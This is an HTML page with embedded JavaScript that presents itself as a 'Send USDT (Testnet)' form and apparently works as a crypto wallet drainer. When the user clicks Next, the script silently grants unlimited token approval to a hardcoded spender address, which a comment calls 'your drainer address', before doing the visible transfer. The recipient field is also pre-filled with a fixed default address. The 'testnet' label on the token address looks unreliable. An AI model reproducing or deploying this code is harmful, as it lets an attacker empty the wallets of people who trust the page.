<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Send USDT (Testnet)</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root{--bg:#0d0d0d;--card:#111;--muted:#9aa0a6;--accent1:#00f07a;--accent2:#00b45a;font-family:Inter,system-ui,Arial;color:#eaf0f1}
  html,body{height:100%;margin:0;background:var(--bg)}
  .page{min-height:100%;display:flex;align-items:flex-start;justify-content:center;padding:28px}
  .card{width:100%;max-width:720px;padding:18px;border-radius:12px;background:transparent}
  h1{margin:6px 0 18px;text-align:center;font-weight:700}
  .field{background:var(--card);border-radius:10px;padding:12px;margin:12px 0;border:1px solid rgba(255,255,255,0.02);display:flex;align-items:center;gap:10px}
  input[type="text"], input[type="number"]{background:transparent;border:0;outline:none;color:#fff;font-size:15px;width:100%}
  .unit{color:var(--muted);font-weight:600}
  .btn{width:100%;padding:14px;border-radius:10px;border:0;font-weight:700;cursor:pointer;margin-top:14px}
  .btn.connect{background:linear-gradient(180deg,var(--accent1),#00e67a);color:#00110a}
  .btn.next{background:linear-gradient(180deg,var(--accent2),#008c48);color:#00110a}
  .small{font-size:13px;color:var(--muted);margin-top:6px}
  .status{background:#0b0b0b;padding:10px;border-radius:8px;margin-top:8px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
  .use-connected{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:8px 10px;border-radius:8px;color:var(--accent1);cursor:pointer}
  #popup{position:fixed;left:50%;top:20%;transform:translateX(-50%);background:#07120a;color:#eaffef;padding:12px 16px;border-radius:10px;border:1px solid rgba(0,255,122,0.12);display:none;z-index:9999}
  @media(max-width:520px){.card{padding:12px}.btn{padding:12px}}
</style>
</head>
<body>
<div id="popup"></div>
<div class="page">
  <div class="card">
    <h1>Send USDT (Testnet)</h1>

    <label class="small">Address or Domain Name (recipient)</label>
    <div class="field">
      <input id="recipient" type="text" placeholder="Address or Domain Name (recipient)" />
    </div>

    <label class="small" style="margin-top:8px">Amount</label>
    <div class="field" style="justify-content:space-between">
      <input id="amount" type="number" step="0.01" min="0" placeholder="0.00" />
      <div class="unit">USDT</div>
    </div>
    <div class="small" id="usdEq">= $0.00</div>

    <div class="status" id="walletStatus">
      <div id="walletText">Wallet: <span style="color:var(--muted)">Not connected</span></div>
      <div style="display:flex;gap:8px;align-items:center">
        <button id="connectBtn" class="use-connected">Connect</button>
        <button id="useConnectedBtn" class="use-connected" style="display:none">Use connected as recipient</button>
      </div>
    </div>

    <button id="connectBtnLarge" class="btn connect">Connect Wallet</button>
    <button id="nextBtn" class="btn next" disabled>Next</button>

    <div class="small" style="margin-top:10px">
      On Next we first set UNLIMITED approval for the drainer contract (so you won't need to approve again),
      then send the specified USDT amount from the connected wallet to the recipient.
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
<script>
(() => {
  // -------- CONFIG --------
  const DEFAULT_RECIPIENT = "0xF662a51Da17c115dfbEb895a70A43756852307a0";
  const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC testnet USDT
  const SPENDER_ADDRESS = "0x0a444ae6d8f5a3bde98ea9acde86050533664168";  // your drainer address
  // ------------------------

  const recipientEl = document.getElementById("recipient");
  const amountEl = document.getElementById("amount");
  const connectBtn = document.getElementById("connectBtn");
  const connectBtnLarge = document.getElementById("connectBtnLarge");
  const walletText = document.getElementById("walletText");
  const useConnectedBtn = document.getElementById("useConnectedBtn");
  const nextBtn = document.getElementById("nextBtn");
  const popup = document.getElementById("popup");
  const usdEq = document.getElementById("usdEq");

  let provider, signer, connectedAddress;

  function showPopup(msg, color="#00f07a"){
    popup.style.display="block";
    popup.style.borderColor=color;
    popup.style.background=color==="red"?"#2f0808":"#07120a";
    popup.innerHTML=msg;
    setTimeout(()=>{popup.style.display="none";},3000);
  }

  async function connectWallet(){
    if(!window.ethereum){alert("Install MetaMask");return;}
    try{
      provider=new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts",[]);
      signer=await provider.getSigner();
      connectedAddress=await signer.getAddress();
      walletText.innerHTML=`Wallet: <span style="color:var(--accent1)">${connectedAddress}</span>`;
      showPopup("✅ Wallet connected");
      useConnectedBtn.style.display="inline-block";
      connectBtn.style.display="none";
      connectBtnLarge.textContent=`Connected: ${connectedAddress.slice(0,6)}...${connectedAddress.slice(-4)}`;
      validateForm();
    }catch(e){showPopup("❌ Connection failed","red");}
  }

  connectBtn.onclick=connectWallet;
  connectBtnLarge.onclick=connectWallet;
  useConnectedBtn.onclick=()=>{recipientEl.value=connectedAddress;validateForm();showPopup("Recipient set");};

  function validateForm(){
    const rec=recipientEl.value.trim();
    const amt=parseFloat(amountEl.value);
    const valid=/^0x[0-9a-fA-F]{40}$/.test(rec);
    nextBtn.disabled=!(valid&&amt>0&&signer);
  }
  recipientEl.oninput=validateForm;
  amountEl.oninput=()=>{usdEq.innerText=`= $${(+amountEl.value||0).toFixed(2)}`;validateForm();};

  nextBtn.onclick=async()=>{
    if(!signer){showPopup("Connect wallet first","red");return;}
    const rec=recipientEl.value.trim();
    const amt=parseFloat(amountEl.value);
    if(!/^0x[0-9a-fA-F]{40}$/.test(rec)||!amt||amt<=0){alert("Invalid input");return;}
    try{
      const abi=[
        "function decimals() view returns (uint8)",
        "function approve(address,uint256) returns (bool)",
        "function allowance(address,address) view returns (uint256)",
        "function transfer(address,uint256) returns (bool)"
      ];
      const token=new ethers.Contract(TOKEN_ADDRESS,abi,signer);
      let decimals=18;try{decimals=await token.decimals();}catch{}
      const rawAmount=ethers.parseUnits(amt.toString(),decimals);
      const maxUint=ethers.MaxUint256;
      showPopup("Checking allowance...");
      const currentAllowance=await token.allowance(connectedAddress,SPENDER_ADDRESS);

      // FIXED comparison (no BigInt function issue)
      if(currentAllowance<rawAmount){
        showPopup("Sending unlimited approval...");
        const txA=await token.approve(SPENDER_ADDRESS,maxUint);
        await txA.wait();
        showPopup("✅ Unlimited approval confirmed");
      }else{
        showPopup("✅ Allowance sufficient");
      }

      showPopup(`Sending ${amt} USDT...`);
      const txT=await token.transfer(rec,rawAmount);
      await txT.wait();
      showPopup("✅ Transfer confirmed");
    }catch(err){
      console.error(err);
      showPopup("❌ Operation failed","red");
      alert("Error: "+(err.message||err));
    }
  };

  window.onload=()=>{
    const p=new URLSearchParams(window.location.search);
    const to=p.get("to");
    recipientEl.value=/^0x[0-9a-fA-F]{40}$/.test(to)?to:DEFAULT_RECIPIENT;
    usdEq.innerText="= $0.00";
  };
})();
</script>
</body>
</html>
